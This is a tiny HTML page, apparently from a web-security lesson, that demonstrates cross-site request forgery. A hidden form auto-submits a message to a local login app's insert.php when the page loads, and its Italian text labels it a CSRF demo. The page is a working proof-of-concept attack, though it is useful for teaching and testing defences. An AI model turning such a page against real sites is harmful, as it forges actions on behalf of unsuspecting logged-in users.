<html>
<body>


    <form method="post" id="form" action="http://localhost:8888/01-app-login/insert.php">
        <textarea name="message_text">Messaggio inviato da un altro sito (demo CSRF)</textarea>
        <input type="submit" value="invia">

    </form>
    <script>
        document.getElementById('form').submit();
    </script>
</body>
</html>
